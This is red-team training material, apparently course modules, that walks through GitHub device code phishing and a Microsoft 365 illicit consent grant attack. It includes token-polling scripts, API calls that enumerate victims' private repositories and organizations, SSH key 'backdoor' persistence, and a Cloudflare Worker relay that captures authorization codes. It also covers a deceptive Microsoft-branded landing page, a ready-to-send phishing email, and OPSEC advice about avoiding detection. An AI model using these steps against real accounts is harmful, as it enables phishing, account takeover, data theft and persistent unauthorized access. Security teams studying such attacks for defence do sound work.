Once the victim receives the phishing message and decides to follow the instructions, they navigate to the legitimate GitHub device login page at `https://github.com/login/device`. This is a genuine GitHub URL, not a phishing site, which is why this attack is so effective against security-aware users.

The victim first sees a prompt to select their GitHub account if they have an active browser session. This page displays all GitHub accounts currently logged into the browser.

The following image shows the account selection screen that victims encounter:

After selecting their account, the victim is prompted to enter the device code. This page clearly states "Enter the code displayed on your device" and provides a text input field for the user code. The victim enters the code from the phishing message, such as "5E3B-C657", and clicks "Continue".

The following image shows the device code entry screen:

If the victim's organization uses SAML single sign-on, they must complete an additional SSO authentication step. GitHub displays a list of organizations that require SSO and prompts the victim to authorize access for each one. The victim must click "Authorize" next to each organization and then complete the SSO flow with their identity provider, which might be Okta, Duo, Microsoft, Google, or another provider. This SSO authentication happens on the legitimate identity provider's domain, further reinforcing the appearance of legitimacy.

After completing any required SSO authentication, GitHub displays the authorization consent screen. This is the critical moment where the victim unknowingly grants the attacker access to their account. The consent screen shows the name of the application requesting access, which in our case is "GitHub CLI" because we used that client ID. It also lists all the scopes being requested, such as "Full control of orgs and teams, read and write org projects", "Create gists", "Full control of private repositories" etc. This page also shows the country (behind the redbox) where the device code was generated, which can sometimes alert suspicious users if the location is unexpected. However, many developers work with distributed teams or use VPNs, so an unusual location may not raise immediate concern.

The following image shows the authorization consent screen with the requested permissions:

Most developers regularly authorize GitHub CLI and are accustomed to seeing this consent screen as part of their normal workflow. The presence of multiple scopes may not raise suspicion because GitHub CLI legitimately requires broad permissions for its functionality. The victim clicks "Authorize GitHub CLI" to grant access.

After authorization, GitHub displays a confirmation page informing the victim that the device is now connected. The page states "Congratulations, you're all set!" and confirms that GitHub CLI has been authorized. The victim believes they have completed a legitimate security update or system requirement and returns to their work.

The following image shows the confirmation page after successful authorization:

### Step 4: Polling for Access Tokens
While the victim is completing the authorization process, the attacker's system must continuously poll GitHub's token endpoint to check if authorization is complete. This polling begins immediately after generating the device code and continues until either the victim authorizes the application or the code expires.

The polling request is a POST request to GitHub's OAuth token endpoint, including the client ID, device code, and grant type:

```
curl -X POST "https://github.com/login/oauth/access_token" \
  -H "Accept: application/json" \
  -d "client_id=178c6fc778ccc68e1d6a" \
  -d "device_code=3584d83530557fdd1f46af8289938c8ef79f9dc5" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:device_code" | jq

```
Breaking down this command, the `-X POST` flag specifies a POST request to the token endpoint. The `-H "Accept: application/json"` header requests JSON format for the response. The `-d "client_id=178c6fc778ccc68e1d6a"` parameter identifies the application, which must match the client ID used when generating the device code. The `-d "device_code=3584d83530557fdd1f46af8289938c8ef79f9dc5"` parameter provides the device code we received in step 1. The `-d "grant_type=urn:ietf:params:oauth:grant-type:device_code"` parameter specifies that we are using the device code grant type as defined in RFC 8628. The `| jq` at the end pipes the response through jq for formatted JSON output.

Before the victim authorizes the application, GitHub responds with an error indicating that authorization is still pending:

```
{
  "error": "authorization_pending",
  "error_description": "The authorization request is still pending."
}

```
This response indicates we should continue polling. To avoid executing manual commands repeatedly, implement an automated polling loop. The `interval` field from the initial device code response specified how long to wait between requests (typically 5 seconds). A simple bash loop can automate this process:

```
while true; do
  response=$(curl -s -X POST "https://github.com/login/oauth/access_token" \
    -H "Accept: application/json" \
    -d "client_id=178c6fc778ccc68e1d6a" \
    -d "device_code=3584d83530557fdd1f46af8289938c8ef79f9dc5" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code")
  
  if echo "$response" | jq -e '.access_token' > /dev/null 2>&1; then
    echo "Authorization successful!"
    echo "$response" | jq
    break
  fi
  
  sleep 5
done

```
This loop continuously polls the token endpoint, checks if the response contains an access token using `jq`, and breaks when authorization is complete. The `sleep 5` command waits 5 seconds between requests to respect GitHub's rate limiting and match the specified interval.

### Step 5: Receiving the Access Token
Once the victim clicks "Authorize" on the consent screen, the next polling request receives a successful response containing access tokens:

```
{
  "access_token": "gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "token_type": "bearer",
  "scope": "repo,user,admin:org,workflow,write:public_key"
}

```
The `access_token` field contains a GitHub OAuth token that begins with the prefix `gho_`. This token can be used immediately to access the GitHub API with all the permissions granted by the scopes. The `token_type` field indicates this is a bearer token, meaning it should be included in the Authorization header as "Bearer token_value". The `scope` field confirms which scopes were actually granted, which should match what we requested unless the user or organization policies restricted some permissions.

The following image shows the successful token acquisition:

It is critical to save this access token securely, as it provides complete access to the victim's GitHub account within the granted scopes. The token should be stored in a secure location on the attacker's system for later use.

GitHub OAuth tokens do not expire automatically like some other OAuth implementations. They remain valid until explicitly revoked by the user or an administrator. This means the attacker can use the token for an extended period, potentially months or years, unless the victim notices the unauthorized authorization and revokes it, check the official documentation here.

## Using Stolen GitHub Tokens
Once you have obtained access tokens through device code phishing, you can leverage them to access the victim's GitHub resources through direct API calls. GitHub's REST API provides comprehensive access to repositories, organizations, user data, and other resources based on the scopes granted during authorization. For a complete list of all available GitHub API endpoints and their capabilities, see the GitHub REST API Documentation.

To authenticate API requests, include the access token in the Authorization header. GitHub's API accepts both `Authorization: Bearer` and `Authorization: token` formats. The API follows RESTful conventions with endpoints organized by resource type.

### Example Use Cases

- Getting the victim's profile information reveals their username, email, company, location, and other account details:

```
curl -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     https://api.github.com/user

```
The following image shows enumeration of the victim's user information:

- Listing the victim's repositories shows all repositories they have access to, including private repositories if the `repo` scope was granted:

```
curl -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     https://api.github.com/user/repos

```
This returns an array of repository objects, each containing the repository name, description, visibility (public or private), clone URLs, and other metadata. For each repository, you can clone the code, examine issues, read pull requests, and access any other repository resources permitted by your scopes.

- Listing organization memberships reveals which organizations the victim belongs to:

```
curl -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     https://api.github.com/user/orgs

```
The following image shows enumeration of organization information:

For each organization, you can enumerate members, teams, repositories, and other resources. If you obtained the `admin:org` scope, you can modify organization settings, add or remove members, and access billing information.

- Getting detailed information about a specific organization:

```
curl -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     https://api.github.com/orgs/target-organization

```

- Listing repository contents allows you to browse files and directories:

```
curl -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     https://api.github.com/repos/victim/private-repo/contents/<folders>

```

- If you obtained the `workflow` scope, you can list GitHub Actions secrets, though you cannot read their values directly:

```
curl -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
     https://api.github.com/repos/victim/repo/actions/secrets

```

While you cannot retrieve secret values through the API, you can modify workflows to exfiltrate secrets during workflow execution.

- The final example use case is for SSH key persistence. You can add your SSH public key to the victim's GitHub account using the `write:public_key` scope. This provides long-term access to repositories without requiring OAuth tokens. First, generate an SSH key pair:

```
ssh-keygen -t ed25519 -f ./backdoor_key -N ""

```
The `ssh-keygen` command generates a new SSH key pair. The `-t ed25519` flag specifies the key type as Ed25519, which is a modern, secure algorithm recommended by GitHub. The `-f ./backdoor_key` flag sets the output filename for the key pair, creating both `backdoor_key` (private key) and `backdoor_key.pub` (public key) in the current directory. The `-N ""` flag sets an empty passphrase, allowing automated use of the key without user interaction.

Next, upload the public key to the victim's GitHub account:

```
curl -X POST \
  -H "Authorization: Bearer gho_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/user/keys \
  -d "{\"title\":\"Security Update - $(date +%Y%m%d)\",\"key\":\"$(cat ./backdoor_key.pub)\"}" | jq

```
This command sends a POST request to GitHub's `/user/keys` endpoint to add a new SSH key. The `-H "Authorization: Bearer ..."` header authenticates using the stolen access token. The `-H "Accept: application/vnd.github.v3+json"` header specifies the GitHub API version. The `-d` parameter sends a JSON payload containing the key title and the public key content. The `$(date +%Y%m%d)` command generates a date-based title like "Security Update - 20241213" to make the key appear legitimate. The `$(cat ./backdoor_key.pub)` command reads and embeds the public key content. The `| jq` pipes the response through jq for formatted output.

OPSEC Reminder: When a new SSH key is added to a GitHub account, GitHub automatically sends an email notification to the account owner. This email includes details about the key that was added, including the key title and the IP address from which it was added. The victim may notice this email and investigate the unauthorized key addition, potentially leading to the discovery of the compromise.

The following image shows successful SSH key addition:

## Automated Attack Tool
For streamlined execution of GitHub device code phishing attacks, an automated tool can handle the entire workflow from code generation through token acquisition and post-exploitation enumeration. The provided `github-device-phishing.sh` script implements this automation.

The tool provides an interactive interface for selecting scopes based on your attack objectives. Rather than manually constructing scope strings, you can choose from predefined configurations like "Maximum Access" which requests `repo,admin:org,workflow,delete_repo,user,write:public_key`, or "Stealth Access" which requests only `repo,user:email` to appear less suspicious.

After selecting scopes, the tool automatically generates a device code by calling GitHub's API and displays the user code and verification URL. It then generates contextually appropriate phishing messages based on the requested scopes. For example, if you requested SSH key access, it generates a message about SSH security updates. If you requested organization access, it generates a message about compliance audits.

The tool implements intelligent token polling that respects GitHub's rate limits and handles errors gracefully. It polls every 5 seconds as specified by GitHub's API, displays status updates, and automatically detects when authorization is complete or when the code expires.

Once tokens are acquired, the tool performs comprehensive enumeration of the victim's account. It retrieves user information, lists all repositories including private ones, enumerates organization memberships, and identifies high-value targets for further exploitation.

If the `write:public_key` scope was granted, the tool can automatically generate an SSH key pair and inject it into the victim's account, establishing persistent access without additional manual steps.

The tool generates detailed reports of all activities, including timestamps, API responses, and enumerated resources. This documentation is valuable for tracking multiple compromised accounts and planning further operations.

To use the tool, first make it executable:

```
chmod +x github-device-phishing.sh

```
The `chmod` command modifies file permissions. The `+x` flag adds execute permission to the script file, allowing it to be run as a program. Without this step, the shell would not permit execution of the script.

Then run the tool:

```
./github-device-phishing.sh

```
The tool presents an interactive menu for selecting your attack configuration. Choose the scope preset that matches your objectives, and the tool handles the rest of the workflow automatically.

The automated tool significantly reduces the time and effort required to execute device code phishing attacks, allowing you to focus on target selection and post-exploitation activities rather than manual API interactions.

## Demo
The following video demonstrates a complete GitHub device code phishing attack from initial code generation through token acquisition and repository access:

The video can be found in folder: `./videos/poc-final.mp4`

## Resources

- Introducing: GitHub Device Code Phishing

- GitHub Device Flow Documentation

- GitHub OAuth Scopes Documentation

- GitHub REST API Documentation

- GitHub Token Expiration and Revocation

- GitHub SSH Key Management

- OAuth 2.0 Device Authorization Grant (RFC 8628)

- OAuth 2.0 Authorization Framework (RFC 6749)

## Objectives
Perform a GitHub device code phishing attack to capture an access token

Explore the various attacks available in the provided tool (github-device-phishing.sh)


---

# Novo Módulo 20 — Illicit Consent Grant (OAuth Phishing)

Novo Módulo 20 — Illicit Consent Grant (OAuth Phishing)

- # Novo Módulo 20 — Illicit Consent Grant (OAuth Phishing)

# Disclaimer
# Module 20 - Illicit Consent Grant

## Introduction
The Illicit Consent Grant Attack is an attack that leverages OAuth 2.0's authorization code flow to gain access to user resources in Microsoft 365 environments. Unlike traditional credential phishing that requires fake login pages and attempts to bypass email security filters, this attack operates entirely through legitimate Microsoft infrastructure by tricking users into granting OAuth permissions to malicious applications.In this attack, an attacker registers a malicious application in their own Microsoft Entra ID tenant, configures it to request access to sensitive resources like emails and files, and then delivers a crafted authorization URL to victims. When a victim clicks the link and approves the consent screen, Microsoft redirects their browser to the attacker's infrastructure with an authorization code. The attacker exchanges this code for access tokens that provide persistent access to the victim's data within the granted scopes.The attack bypasses traditional security controls because the victim authenticates with their real credentials on Microsoft's legitimate domains, completes their MFA as normal, and explicitly grants consent to what appears to be a third-party application. The victim never provides credentials to the attacker, and no credential theft occurs. Instead, the attack exploits the trust users place in the OAuth consent mechanism and their inability to distinguish malicious applications from legitimate ones.In this module, we will examine how the authorization code flow works and how it can be exploited, implement a complete attack infrastructure by registering an OAuth application and deploying a relay server to capture authorization codes, demonstrate token acquisition and exchange, explore post-exploitation techniques using Microsoft Graph API to access emails, files, and other resources, and discuss the warning signs users should recognize when reviewing consent screens.
This module builds upon concepts covered in the Microsoft and GitHub Device Code Phishing modules. If you have not completed those modules, review the OAuth 2.0 sections there for foundational knowledge about OAuth roles, scopes, and grant types.

## Authorization Code Flow
The authorization code grant is the most common OAuth 2.0 flow for web applications. Unlike the device code flow covered in previous modules, the authorization code flow is designed for applications that can securely store client secrets and handle browser redirects. This flow is used by most third-party applications that integrate with Microsoft 365, making it familiar to users who regularly authorize productivity tools and integrations.
### Microsoft Graph Permissions
Microsoft Graph API provides programmatic access to Microsoft 365 resources including emails, files, calendars, user profiles, and organizational data. Applications request access to these resources through permissions, which are defined as OAuth scopes. Microsoft Graph defines two types of permissions:
Delegated Permissions (access on behalf of a user): Allow the application to act on behalf of a signed-in user. The application can only access resources that the user can access. For example, an application with the `Mail.Read` delegated permission can read emails in the signed-in user's mailbox, but not emails in other users' mailboxes unless the signed-in user has explicit access to those mailboxes.

- Application Permissions (Access without a user): Allow the application to access resources without a signed-in user, typically for background services and automation. Application permissions provide tenant-wide access and require administrator consent. For example, the `Mail.Read.All` application permission allows reading all emails in all mailboxes in the organization.

The image below from Microsoft's official documentation illustrates the differences in the permissions.

In illicit consent grant attacks, we exploit delegated permissions because regular users can grant them without administrator approval. When a user grants delegated permissions to an application, that application gains access only to resources that specific user can access. Common Microsoft Graph delegated permissions include:

- `Mail.Read`: Read emails in the user's mailbox

- `Mail.Send`: Send emails on behalf of the user

- `Files.ReadWrite.All`: Access and modify all files the user can access in OneDrive and SharePoint

- `Notes.Read.All`: Read OneNote notebooks

- `MailboxSettings.ReadWrite`: Modify mailbox settings including creating forwarding rules

- `Contacts.Read`: Read the user's contacts

- `User.ReadBasic.All`: Read basic profile information for all users in the organization

For a complete reference of all available Microsoft Graph permissions, see the Microsoft Graph permissions reference.

### Authorization Code Flow Walkthrough
To understand how illicit consent grant attacks work, we must first understand the legitimate authorization code flow. This is a multi-step process involving redirects between the client application, authorization server, and resource owner's browser.

The flow begins when a user attempts to use a third-party application that requires access to their Microsoft 365 resources. The application redirects the user's browser to Microsoft's authorization endpoint with several parameters including the application's client ID, the requested scopes, and a redirect URI where Microsoft should send the authorization response.

The user arrives at Microsoft's login page, which is hosted on legitimate Microsoft domains like `login.microsoftonline.com`. The user enters their credentials and completes any required multi-factor authentication. This authentication happens entirely on Microsoft's infrastructure, so the client application never sees the user's password or MFA codes.

After successful authentication, Microsoft presents a consent screen to the user. This screen displays the name of the application requesting access, the permissions it is requesting (the scopes), and information about the application publisher. The user must explicitly click "Accept" to grant the application access. If the user clicks "Cancel", the authorization flow stops and the application receives an error.

If the user accepts, Microsoft redirects the user's browser back to the application's redirect URI with an authorization code in the URL parameters. This authorization code is a short-lived token that proves the user granted consent. The authorization code typically expires in 10 minutes and can only be used once.

The application's backend server receives the authorization code and makes a direct server-to-server request to Microsoft's token endpoint. This request includes the authorization code, the application's client ID, the application's client secret (which proves the request is from the legitimate application), and the redirect URI. Microsoft validates all these parameters and responds with an access token and refresh token.

The access token is a JWT (JSON Web Token) that the application can use to make authenticated requests to Microsoft Graph API on behalf of the user. Access tokens are typically valid for 1 hour. The refresh token is a long-lived token that the application can use to obtain new access tokens without requiring the user to re-authenticate. Refresh tokens can remain valid for months, providing long-term access even if the user changes their password.

This entire flow is designed to be secure. The user's credentials never leave Microsoft's infrastructure, the authorization code is short-lived and single-use, the client secret is required to exchange the code for tokens, and the user explicitly consents to the requested permissions. However, as we will see, this flow can be exploited through social engineering.

### Understanding the Illicit Consent Grant Attack Flow
OAuth 2.0 has no mechanism to verify that the user intends to grant access to a specific application. The protocol only verifies that the user authenticated successfully and clicked "Accept" on the consent screen. This limitation can be exploited through social engineering.

In an illicit consent grant attack, the attacker creates an OAuth application in their own Microsoft Entra ID tenant and registers it as a multi-tenant application, allowing users from any organization to authorize it. The attacker gives the application a legitimate-sounding name like "Office 365 Security Update" or "Microsoft Teams Integration" to reduce suspicion during the consent flow.

The attacker begins by registering a malicious OAuth application and configuring a redirect URI pointing to infrastructure they control. When a victim grants consent, Microsoft will send the authorization code to this attacker-controlled endpoint.

The attacker crafts an authorization URL containing their application's client ID, the desired scopes, and the redirect URI. This URL points to legitimate Microsoft domains and will display a real Microsoft consent screen. The attacker delivers this URL to the victim through phishing emails or other social engineering methods.

When the victim clicks the link, they are directed to Microsoft's authentication pages. They authenticate with their credentials and complete MFA on legitimate Microsoft infrastructure. The victim then sees a consent screen showing the application name and requested permissions.

If the victim clicks "Accept", Microsoft generates an authorization code and redirects the victim's browser to the attacker's configured redirect URI with the code included as a URL parameter.

The attacker's server captures the authorization code and immediately exchanges it for access tokens by making a request to Microsoft's token endpoint. This request includes the authorization code, client ID, and client secret. Since the attacker created the application, they possess the client secret. Microsoft validates the request and issues access tokens.

The attacker now has access tokens that can be used to access the victim's Microsoft 365 resources within the granted scopes. The tokens can be refreshed for long-term access, and the victim never provided their credentials to the attacker.

## Setting Up the Attack Infrastructure
Now that we understand the theoretical foundations of OAuth 2.0 and how illicit consent grant attacks exploit the authorization flow, we will implement a complete attack infrastructure. This involves three main components: registering a malicious OAuth application in Microsoft Entra ID, setting up a relay server to capture authorization codes, and crafting a phishing link to deliver to victims.

### Step 1: Registering the Malicious Application
The first step is to create an OAuth application that will request permissions from victims. You will need a Microsoft account to register an application in Microsoft Entra ID. You can use a personal Microsoft account or create a new Azure trial account for testing purposes.

Navigate to the Azure Portal and sign in with your Microsoft account. If this is your first time accessing the Azure Portal, you may be prompted to set up your directory.

Once logged in, use the search bar at the top of the portal to search for "Azure Active Directory" or "Microsoft Entra ID". Click on the service to access the identity management interface.

In the left sidebar of the Entra ID interface, locate and click on "Enterprise apps". This section manages all OAuth applications registered in your tenant. Click the "New application" button at the top to begin creating a new application.

After clicking "New application", you will need to select "Create your own application" to register a custom OAuth application.

The application registration form requires several pieces of information. The "Name" field determines what victims will see on the consent screen, so choose something that appears legitimate and trustworthy. Examples of effective names include "Office 365 Security Update", "Microsoft Teams Integration", "SharePoint Sync Tool", or "Microsoft Graph Explorer". Avoid obviously malicious names or names that might raise suspicion.

For the purposes of the module, we have named it `ThisIsNotAPhis` to make it clearer and more identifiable.

The "Supported account types" section is critical for the attack. You must select "Accounts in any organizational directory (Any Azure AD directory - Multitenant)" to allow users from other organizations to authorize your application. If you select single-tenant, only users in your own tenant can grant consent, which defeats the purpose of the attack.

The "Redirect URI" is where Microsoft will send the authorization code after the victim grants consent. For now, you can leave this blank or enter a placeholder like `https://localhost`. We will update this later once we have our relay server deployed. Click "Register" to create the application.

After registration completes, you will be redirected to the application's overview page. This page displays critical information about your application. The "Application (client) ID" is a GUID that uniquely identifies your application. Copy this value and save it securely, as you will need it to construct the authorization URL. The "Directory (tenant) ID" identifies your Entra ID tenant, though this is less critical for the attack.

### Step 2: Creating a Client Secret
OAuth applications use client secrets to authenticate when exchanging authorization codes for access tokens. Think of the client secret as a password for your application. When your relay server receives an authorization code and attempts to exchange it for tokens, Microsoft requires both the client ID and client secret to verify that the request is legitimate.

In the left sidebar of your application's management page, click on "Certificates & secrets". This section manages authentication credentials for your application. Click "New client secret" to generate a new secret.

You will be prompted to enter a description for the secret and select an expiration period. The description is only for your reference and is not shown to users. For testing purposes, you can use a description like "Phishing Campaign" or "Token Exchange". Select an expiration period that matches your engagement timeline. For long-term access, select "24 months", but be aware that you will need to regenerate the secret before it expires to maintain access.

After clicking "Add", the secret value will be displayed once. This is the only time Microsoft shows the secret value, so copy it immediately and store it securely. If you lose the secret, you will need to generate a new one. The secret value is a long random string that looks something like `ABC123~XYZ789defGHI456jklMNO012pqrSTU345`.

OPSEC Note: Treat the client secret as a sensitive credential. Anyone with the client ID and client secret can exchange authorization codes intended for your application and obtain access tokens. Store secrets in a secure password manager or encrypted storage.

### Step 3: Configuring Application Permissions
Now we must define what permissions our malicious application will request from victims. This is a critical decision that balances two competing objectives: requesting enough permissions to achieve your attack goals, while not requesting so many permissions that the consent screen appears suspicious.

In the left sidebar of your application's management page, click on "API permissions". This section defines what Microsoft Graph scopes your application can request. Click "Add a permission" to begin adding permissions.

Microsoft displays a selection of APIs that you can request permissions for. Click on "Microsoft Graph", as this is the primary API for accessing Microsoft 365 resources like email, files, and calendars.

Microsoft Graph offers two permission types: Delegated permissions and Application permissions. For an illicit consent grant attack, you must select "Delegated permissions". Delegated permissions allow your application to act on behalf of the signed-in user and only access resources that user can access. Application permissions require administrator consent and allow access to organization-wide resources, which a regular user cannot grant.

The permission selection interface allows you to search for and select specific scopes. Microsoft groups permissions by resource type such as "Mail", "Files", "Calendars", "User", etc. For a comprehensive attack that maximizes access while remaining plausible, consider requesting the following permissions:

- `Mail.Read`: Allows reading all emails in the user's mailbox. This is essential for intelligence gathering and identifying sensitive information.

- `Mail.Send`: Allows sending emails on behalf of the user. This can be used for lateral phishing attacks, sending malicious links to the victim's contacts, or impersonating the victim.

- `Files.ReadWrite.All`: Provides access to all files that the user can access in OneDrive and SharePoint. This allows exfiltration of sensitive documents and potentially uploading malicious files.

- `Notes.Read.All`: Grants access to OneNote notebooks, which often contain sensitive project information, meeting notes, and credentials.

- `MailboxSettings.ReadWrite`: Allows modifying mailbox settings including creating mail forwarding rules. This can provide persistent access by forwarding copies of all future emails to an attacker-controlled address.

- `Contacts.Read`: Provides access to the user's contact list, which can be useful for identifying additional targets and understanding organizational relationships.

- `User.ReadBasic.All`: Allows reading basic profile information for all users in the organization, which is useful for reconnaissance and identifying high-value targets.

After selecting your desired permissions, click "Add permissions" to configure them for your application. Note that these permissions define what your application can request, but the actual permissions granted depend on what scopes you include in the authorization URL and what the victim approves.

### Step 4: Setting Up the Relay Server with Cloudflare Workers
With the OAuth application configured, we now need infrastructure to receive authorization codes when victims grant consent. When a victim clicks "Accept" on the consent screen, Microsoft redirects their browser to our configured redirect URI with the authorization code in the URL parameters. We need a server to capture this code and exchange it for access tokens.

For this attack, we will use Cloudflare Workers, a serverless platform that allows us to run code at the edge without managing traditional servers. Cloudflare Workers provides several advantages for phishing infrastructure: automatic HTTPS with trusted certificates, global distribution for low latency, no server maintenance or patching required, and built-in DDoS protection.

If you have not already set up a Cloudflare Workers project, refer to the previous modules in this course that cover Cloudflare Workers deployment. For this module, we will focus specifically on the code required to capture authorization codes.

Navigate to the `relaying-server` directory in this module's provided files. This directory contains a complete Cloudflare Worker implementation. The core logic is in `src/index.js`, which implements two main endpoints. The `/login/authorized` endpoint captures the authorization code from Microsoft's OAuth redirect, while the root path `/` serves a professional phishing landing page that mimics a Microsoft security update.

The worker's main handler inspects incoming requests and routes them to the appropriate endpoint:

```
export default {
	async fetch(request, env, ctx) {
		const url = new URL(request.url);
		const path = url.pathname;

		// Handle /login/authorized endpoint - captures OAuth code
		if (path === '/login/authorized') {
			const code = url.searchParams.get('code');
			console.log('Code:', code);
			
			// Return success page after authorization
			return new Response(getSuccessPage(), {
				headers: { 'Content-Type': 'text/html' }
			});
		}

		// Default response for root - phishing landing page
		return new Response(getLandingPage(), {
			headers: { 'Content-Type': 'text/html' }
		});
	},
};

```
When a request arrives at `/login/authorized`, the worker extracts the `code` parameter from the URL query string using `url.searchParams.get('code')`. This is the authorization code that Microsoft sends after the victim grants consent. The worker logs this code to the console (viewable with `wrangler tail`) and returns a success confirmation page to the victim.

For requests to the root path (`/`), the worker serves a phishing landing page through the `getLandingPage()` function. This function contains the HTML and CSS for a professional Microsoft-themed interface that includes the Microsoft logo, security messaging, and an authorization button. The landing page automatically constructs the complete OAuth authorization URL with your application's client ID, requested scopes, and redirect URI. When a victim clicks the authorization button, they are seamlessly redirected to Microsoft's legitimate authentication flow. We will explore the landing page design and OAuth URL construction in detail in Step 6.

Before deploying the worker, you must configure your application's client ID. Open `src/index.js` and locate the `getLandingPage()` function. Update the `CLIENT_ID` constant with your Application (client) ID from Azure Portal, and ensure the `REDIRECT_URI` constant matches your worker's `/login/authorized` endpoint. The `SCOPES` variable defines which permissions the malicious application will request from victims.

The worker also includes a `getSuccessPage()` function that returns a professional confirmation page shown to victims after they authorize the application. This page displays the Microsoft logo, a success icon, and a message confirming the security update was applied.

To deploy the worker to Cloudflare's global network, navigate to the `relaying-server` directory and run:

```
wrangler deploy

```
After deployment, you will receive a URL where your worker is accessible, such as `https://relaying-server.redeem-activation.workers.dev`. This is the URL you will configure as your OAuth application's redirect URI.

To view authorization codes captured by your worker in real-time, use Wrangler's tail command:

```
npx wrangler tail

```
This streams the worker's console logs to your terminal, allowing you to see the `console.log('Code:', code)` output whenever someone authorizes your application.

You can also monitor your worker's activity through the Cloudflare dashboard. Navigate to Workers & Pages in your Cloudflare account, select your worker, and click on the "Logs" tab to view real-time request logs and console output through the web interface.

### Step 5: Configuring the Redirect URI
The redirect URI is where Microsoft will send users after they complete the OAuth authorization flow. This must point to the `/login/authorized` endpoint of your Cloudflare Worker, which is the endpoint that captures the authorization code.

Return to the Azure Portal and navigate to your application's management page. In the left sidebar, click on "Authentication". This section manages redirect URIs and other authentication configuration. Under the "Platform configurations" section, click "Add a platform". Microsoft will ask what type of platform you are configuring. Select "Web" since we are using a web-based endpoint to receive the authorization code.

In the "Redirect URIs" field, enter your Cloudflare Worker URL followed by the `/login/authorized` path. This must match the `REDIRECT_URI` constant you configured in the worker's `src/index.js` file. For example, if your worker is deployed at `https://relaying-server.redeem-activation.workers.dev`, enter:

```
https://relaying-server.redeem-activation.workers.dev/login/authorized

```
This tells Microsoft that when a user grants consent to your application, their browser should be redirected to this URL with the authorization code included as a query parameter. The worker's `/login/authorized` endpoint will capture this code and log it to the console.

Ensure that the "Supported account types" remains set to "Accounts in any organizational directory (Any Azure AD directory - Multitenant)". This is visible in the "Authentication" section under "Supported account types".

Click "Configure" and then "Save" to apply the changes. Microsoft will validate that the redirect URI is a valid HTTPS URL. Once saved, your application is fully configured and ready to be used in an attack.

### Step 6: Delivering the Phishing Attack
The Cloudflare Worker implements two distinct endpoints that work together to execute the attack. The landing page endpoint at the root path (`/`) is what victims see when they first visit your worker. When victims visit the root URL, they see a professional Microsoft-themed phishing page that includes the Microsoft logo, security messaging, and an "Authorize Security Update" button that automatically constructs and initiates the OAuth flow. After victims authorize the application on Microsoft's legitimate consent screen, Microsoft redirects them back to the authorization code capture endpoint at `/login/authorized`, where the worker captures the code and displays a success confirmation page.

The landing page displayed at the worker's root URL (i.e. `https://relaying-server.redeem-activation.workers.dev/`) presents a convincing Microsoft security update interface. The page features the official Microsoft logo with the classic four-color square design alongside a "Microsoft 365" branding header. To add an additional layer of legitimacy, the page includes a "Powered by MALDEV ACADEMY" line. The content focuses on security-focused messaging about a required update, supported by three feature items with icons that emphasize security benefits such as enhanced protocols, data encryption, and compliance standards. At the center of the page is a prominent blue "Authorize Security Update" button that initiates the OAuth flow.

When the victim clicks the "Authorize Security Update" button, the worker automatically constructs the OAuth authorization URL with all necessary parameters. This URL construction happens in the `getLandingPage()` function within the worker code:

```
function getLandingPage() {
	// Replace CLIENT_ID with your Application (client) ID from Azure Portal
	const CLIENT_ID = 'YOUR_CLIENT_ID_HERE';
	
	// Update REDIRECT_URI to match your worker's deployed URL
	const REDIRECT_URI = 'https://relaying-server.redeem-activation.workers.dev/login/authorized';
	
	// SCOPES define the permissions requested from victims
	const SCOPES = 'Mail.Read Mail.Send Files.ReadWrite.All Notes.Read.All MailboxSettings.ReadWrite Contacts.Read User.ReadBasic.All openid profile offline_access';
	
	// Construct the OAuth authorization URL
	const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&scope=${encodeURIComponent(SCOPES)}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_mode=query&prompt=consent&state=12345`;

	// ... HTML template follows
}

```
The constructed URL includes the `client_id` parameter with your Application (client) ID from Azure Portal, `response_type=code` to specify the authorization code grant flow, and the `scope` parameter containing the permissions configured in the `SCOPES` constant such as `Mail.Read`, `Files.ReadWrite.All`, and other delegated permissions. The `redirect_uri` parameter points to the worker's `/login/authorized` endpoint, while `response_mode=query` ensures the code is returned as a URL parameter. The `prompt=consent` parameter forces the consent screen to display even if the user previously authorized the application, and a `state` parameter provides CSRF protection.

The victim is then redirected to Microsoft's legitimate authorization endpoint at `login.microsoftonline.com/common/oauth2/v2.0/authorize`, where they authenticate and see the consent screen.

#### Delivery Methods
To execute the attack, deliver victims to the worker's landing page URL through various delivery vectors. Email phishing provides a straightforward approach by sending an email claiming a security update or compliance requirement with a link to your worker URL. For example, a message with the subject "[ACTION REQUIRED] Microsoft 365 Security Update" could inform the user that their account requires a critical security update to maintain compliance with the latest security protocols, directing them to visit the worker URL within 24 hours to avoid account restrictions. This approach leverages urgency and the appearance of legitimate IT communications.

```
Subject: [ACTION REQUIRED] Microsoft 365 Security Update

Dear User,

We have detected that your Microsoft 365 account requires a critical security 
update to maintain compliance with our latest security protocols.

Please visit the following link to complete the update:
https://relaying-server.redeem-activation.workers.dev

This update must be completed within 24 hours to avoid account restrictions.

Best regards,
Microsoft Security Team

```

## Executing the Attack
With all infrastructure configured, we can now walk through the complete attack flow from the victim's perspective. This section demonstrates what happens when a victim receives your phishing message, visits the worker's landing page, and grants consent to your malicious application.

### Victim's Perspective
The attack begins when the victim receives your phishing message containing a link to the worker's landing page. When the victim clicks the link, their browser loads the professional Microsoft-themed phishing page you configured in the worker.

The victim sees the landing page with the Microsoft logo, security messaging, and the "Authorize Security Update" button. The page appears legitimate due to the familiar Microsoft branding and professional design. When the victim clicks the "Authorize Security Update" button, the worker's JavaScript automatically redirects them to Microsoft's legitimate OAuth authorization endpoint with all the required parameters pre-configured.

